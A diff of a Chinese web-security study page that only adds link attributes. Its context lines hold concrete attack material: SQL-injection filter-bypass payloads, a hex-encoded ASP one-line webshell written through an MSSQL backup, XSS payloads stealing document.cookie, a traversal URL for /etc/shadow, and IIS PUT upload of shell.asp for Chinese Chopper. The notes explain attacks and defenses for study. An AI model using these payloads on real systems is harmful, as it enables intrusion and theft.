@@ -865,7 +865,7 @@
 </ul>
 <p>区别二：</p>
 <ul>
-<li>get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，多个请求数据间用”&amp;”连接，如<a href="http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的。">http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的。</a></li>
+<li>get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，多个请求数据间用”&amp;”连接，如<a href="http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的。" target="_blank" rel="noopener">http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的。</a></li>
 <li>post传输数据通过Http的post机制，将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的。</li>
 </ul>
 <p>区别三：</p>
@@ -935,8 +935,8 @@
 <p>​    如果在Windows系统的DNS缓存也没有找到，那么<strong>尝试读取hosts文件，</strong> 看看这里面有没有该域名对应的IP地址，如果有则解析成功。</p>
 <p><strong>4.先访问系统配置的首选DNS服务器</strong></p>
 <p>​    浏览器就会发起一个DNS的系统调用，就会向本地配置的首选DNS服务器（一般是电信运营商提供的，也可以使用像Google提供的DNS服务器）发起域名解析请求</p>
-<p><strong>5.如果首DNS服务器不能解析,则由首选DNS服务器代替向各个DNS</strong>(<strong>迭代式</strong>)<br>    (1)<strong>首先访问根域名服务器(</strong>DNS服务器内一般都会内置13台根域名服务器的地址)，查询完整域名的ip地址（<a href="http://www.baidu.com），但是根域名会回答不知道完整域名的地址，但知道顶级域名(.com)的ip地址">www.baidu.com），但是根域名会回答不知道完整域名的地址，但知道顶级域名(.com)的ip地址</a></p>
-<p>​    (2)<strong>再去访问对应顶级域名的ip地址</strong>，尝试查询完整域名的ip地址，但是顶级域名服务器告诉运营商的DNS我不知道完整域名（<a href="http://www.baidu.com）这个域名的IP地址，但是我知道baidu.com这个域的DNS地址">www.baidu.com）这个域名的IP地址，但是我知道baidu.com这个域的DNS地址</a></p>
+<p><strong>5.如果首DNS服务器不能解析,则由首选DNS服务器代替向各个DNS</strong>(<strong>迭代式</strong>)<br>    (1)<strong>首先访问根域名服务器(</strong>DNS服务器内一般都会内置13台根域名服务器的地址)，查询完整域名的ip地址（<a href="http://www.baidu.com），但是根域名会回答不知道完整域名的地址，但知道顶级域名(.com)的ip地址" target="_blank" rel="noopener">www.baidu.com），但是根域名会回答不知道完整域名的地址，但知道顶级域名(.com)的ip地址</a></p>
+<p>​    (2)<strong>再去访问对应顶级域名的ip地址</strong>，尝试查询完整域名的ip地址，但是顶级域名服务器告诉运营商的DNS我不知道完整域名（<a href="http://www.baidu.com）这个域名的IP地址，但是我知道baidu.com这个域的DNS地址" target="_blank" rel="noopener">www.baidu.com）这个域名的IP地址，但是我知道baidu.com这个域的DNS地址</a></p>
 <p>​    (3)这样无限迭代，直到查到完整域名的ip地址</p>
 </blockquote>
 <h5 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h5><blockquote>
@@ -1929,11 +1929,11 @@
 <p><strong>常见混淆方式：</strong></p>
 <blockquote>
 <p>1.使用注释来进行截断</p>
-<p><a href="http://victim.com/news.php?id+un/**/ion+se/**/lect+1,2,3">http://victim.com/news.php?id+un/**//ion+se/**/lect+1,2,3</a>–</p>
+<p><a href="http://victim.com/news.php?id+un/**/ion+se/**/lect+1,2,3" target="_blank" rel="noopener">http://victim.com/news.php?id+un/**//ion+se/**/lect+1,2,3</a>–</p>
 <p>2.变换大小写</p>
-<p><a href="http://victim.com/news.php?id=1+UnIoN">http://victim.com/news.php?id=1+UnIoN</a> SeLecT 1,2,3–</p>
+<p><a href="http://victim.com/news.php?id=1+UnIoN" target="_blank" rel="noopener">http://victim.com/news.php?id=1+UnIoN</a> SeLecT 1,2,3–</p>
 <p>3.替换关键词(将关键词插在关键词中)</p>
-<p><a href="http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--">http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--</a></p>
+<p><a href="http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--" target="_blank" rel="noopener">http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--</a></p>
 </blockquote>
 <p><strong>解决方法</strong>：</p>
 <blockquote>
@@ -1946,7 +1946,7 @@
 <p>用工具对目标站直接写入一句话<strong>条件</strong>:root权限以及绝对路径</p>
 <p>方式：</p>
 <p>​    1.</p>
-<p>​        (1)创建自己的数据库  <a href="http://www.aspx-sqli.com/index.asp?id=1;create database zhong">http://www.aspx-sqli.com/index.asp?id=1;create%20database%20zhong</a>;</p>
+<p>​        (1)创建自己的数据库  <a href="http://www.aspx-sqli.com/index.asp?id=1;create database zhong" target="_blank" rel="noopener">http://www.aspx-sqli.com/index.asp?id=1;create%20database%20zhong</a>;</p>
 <p>​        (2)先进行一次完整备份： ?id=1;backup database zhong to disk = ‘E:\wwwroot\asp_sqli’;</p>
 <p>​        (3)创建新表：在数据库名为中的库里面创建一个新的cmd表 create table [dbo].[zhong] ([cmd] [image]);</p>
 <p>​        (4)向cmd表中插入数据 ?id=1;insert into zhong(cmd) values(0x3C25657865637574652872657175657374282276616C7565222929253E);</p>
@@ -1959,10 +1959,10 @@
 <p>​    又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。</p>
 <p>​    例：</p>
 <p>正常发送消息：</p>
-<p>​    <a href="http://www.test.com/message.php?send=Hello,World！">http://www.test.com/message.php?send=Hello,World！</a></p>
+<p>​    <a href="http://www.test.com/message.php?send=Hello,World！" target="_blank" rel="noopener">http://www.test.com/message.php?send=Hello,World！</a></p>
 <p>接收者将会接收信息并显示Hello,Word</p>
 <p>非正常发送消息：</p>
-<p>​    <a href="http://www.test.com/message.php?send=">http://www.test.com/message.php?send=</a><script>alert(‘foolish!’)</script>！</p>
+<p>​    <a href="http://www.test.com/message.php?send=" target="_blank" rel="noopener">http://www.test.com/message.php?send=</a><script>alert(‘foolish!’)</script>！</p>
 <p>接收者接收消息显示的时候将会弹出警告窗口</p>
 <p><strong>2.存储型xss</strong></p>
 <p>​    又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器,脚本执行。持久的XSS相比非持久性XSS攻击危害性更大,因为每当用户打开页面，查看内容时脚本将自动执行。</p>
@@ -1981,9 +1981,9 @@
 <p>例：</p>
 <p>欢迎页面中name是截取URL中get过来的name参数</p>
 <p><strong>正常操作：</strong></p>
-<p><a href="http://www.vulnerable.site/welcome.html?name=Joe">http://www.vulnerable.site/welcome.html?name=Joe</a></p>
+<p><a href="http://www.vulnerable.site/welcome.html?name=Joe" target="_blank" rel="noopener">http://www.vulnerable.site/welcome.html?name=Joe</a></p>
 <p><strong>非正常操作：</strong></p>
-<p><a href="http://www.vulnerable.site/welcome.html?name=">http://www.vulnerable.site/welcome.html?name=</a><script>alert(document.cookie)</script></p>
+<p><a href="http://www.vulnerable.site/welcome.html?name=" target="_blank" rel="noopener">http://www.vulnerable.site/welcome.html?name=</a><script>alert(document.cookie)</script></p>
 </blockquote>
 <p><strong>危害：攻击者能够在受害者浏览器中执行脚本以及劫持用户会话、迫害网站、插入恶意内容等</strong></p>
 <h5 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h5><blockquote>
@@ -2013,7 +2013,7 @@
 <p>例如：</p>
 <script>\u0061\u006c\u0065\u0072\u0074(1)</script>
 
-<p>​    解码后为<script>alert(1)</script>,一样可以弹窗</p>
+</p><p>​    解码后为<script>alert(1)</script>,一样可以弹窗</p>
 <p>利用点:当<strong>js解释器</strong>在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效</p>
 </blockquote>
 <p><strong>为什么常常将DOM型xss单独列出？DOM型xss和其他两种有什么区别？</strong></p>
@@ -2075,15 +2075,15 @@
 <h5 id="常见攻击形式："><a href="#常见攻击形式：" class="headerlink" title="常见攻击形式："></a>常见攻击形式：</h5><blockquote>
 <p> <strong>目录遍历</strong></p>
 <p>​    假设 Web 应用程序允许为要呈现给用户存储在本地计算机上的文件。如果应用程序不验证应访问哪些文件，攻击者可以请求其他文件系统上的文件和那些也会显示。</p>
-<p>例如，如果攻击者通知 URL:<br>    <a href="https://oneasp.com/file.jsp?file=report.txt">https://oneasp.com/file.jsp?file=report.txt</a></p>
-<p>攻击者可以修改文件参数使用目录遍历攻击。他修改的 URL:<br>    <a href="https://oneasp.com/file.jsp?file=**../../../etc/shadow*">https://oneasp.com/file.jsp?file=**../../../etc/shadow*</a>*</p>
+<p>例如，如果攻击者通知 URL:<br>    <a href="https://oneasp.com/file.jsp?file=report.txt" target="_blank" rel="noopener">https://oneasp.com/file.jsp?file=report.txt</a></p>
+<p>攻击者可以修改文件参数使用目录遍历攻击。他修改的 URL:<br>    <a href="https://oneasp.com/file.jsp?file=**../../../etc/shadow*" target="_blank" rel="noopener">https://oneasp.com/file.jsp?file=**../../../etc/shadow*</a>*</p>
 <p>这样 /etc/阴影文件返回并且呈现由 file.jsp 演示页面容易受到目录遍历攻击。</p>
 <p><strong>开方重定向</strong></p>
 <p>​     Web 应用程序有一个参数，允许其他地方的用户重定向到网站。如果此参数不实现正确使用白名单，攻击者可使用这一网络钓鱼攻击引诱到他们选择的站点的潜在受害者。</p>
 </blockquote>
 <p>例：</p>
-<p>例如，如果攻击者通知 URL:<br><a href="https://oneasp.com/file.jsp?file=report.txt">https://oneasp.com/file.jsp?file=report.txt</a></p>
-<p>攻击者可以修改文件参数使用目录遍历攻击。他修改的 URL:<br><a href="https://oneasp.com/file.jsp?file=**../../../etc/shadow*">https://oneasp.com/file.jsp?file=**../../../etc/shadow*</a>*</p>
+<p>例如，如果攻击者通知 URL:<br><a href="https://oneasp.com/file.jsp?file=report.txt" target="_blank" rel="noopener">https://oneasp.com/file.jsp?file=report.txt</a></p>
+<p>攻击者可以修改文件参数使用目录遍历攻击。他修改的 URL:<br><a href="https://oneasp.com/file.jsp?file=**../../../etc/shadow*" target="_blank" rel="noopener">https://oneasp.com/file.jsp?file=**../../../etc/shadow*</a>*</p>
 <h5 id="防范："><a href="#防范：" class="headerlink" title="防范："></a>防范：</h5><blockquote>
 <p>1.验证用户输入的url请求，拒绝包含../和./的请求</p>
 <p>2.锁定服务器上的</p>
@@ -2097,8 +2097,8 @@
 <p><img src="https://images2015.cnblogs.com/blog/1076111/201701/1076111-20170121133837078-989051273.png" alt="img"></p>
 <p>（2）使用iiswrite.exe应用,使用此软件来利用IIS写权限漏洞上传一句话木马。</p>
 <p>1.以PUT方式上传22.txt文件。检查目标网站是否有test.txt文件显示出错,说明没有 test.txt文件,那么我们可以请求的文件名可以为22.txt。域名为192.168.1.119,点击提交 数据包。重新访问 192.168.1.119/test.txt显示上传内容,说明上传成功。</p>
-<p>2.使用COPY方式复制一份数据,数据的文件名为shell.asp,点击提交数据。使用浏览 器访问<a href="http://192.168.1.119/shell.asp发现访问成功,没有出错,说明复制成功。">http://192.168.1.119/shell.asp发现访问成功,没有出错,说明复制成功。</a></p>
-<p>3.打开中国菜刀,鼠标右键点击添加输入地址<a href="http://192.168.1.119/shell.asp密码为chop">http://192.168.1.119/shell.asp密码为chop</a> per点击添加。双击打开连接,获取到服务器的目录,看到有上传的shell.asp文件 和 test.txt文件。</p>
+<p>2.使用COPY方式复制一份数据,数据的文件名为shell.asp,点击提交数据。使用浏览 器访问<a href="http://192.168.1.119/shell.asp发现访问成功,没有出错,说明复制成功。" target="_blank" rel="noopener">http://192.168.1.119/shell.asp发现访问成功,没有出错,说明复制成功。</a></p>
+<p>3.打开中国菜刀,鼠标右键点击添加输入地址<a href="http://192.168.1.119/shell.asp密码为chop" target="_blank" rel="noopener">http://192.168.1.119/shell.asp密码为chop</a> per点击添加。双击打开连接,获取到服务器的目录,看到有上传的shell.asp文件 和 test.txt文件。</p>
 </blockquote>
 <h5 id="防范-3"><a href="#防范-3" class="headerlink" title="防范"></a>防范</h5><blockquote>
 <p>1.了解并及时部署每个环境的软件更新和补丁信息</p>
@@ -2293,7 +2293,6 @@
       mermaid.initialize({theme: 'forest'});
     }
   </script>
-
 
 
         
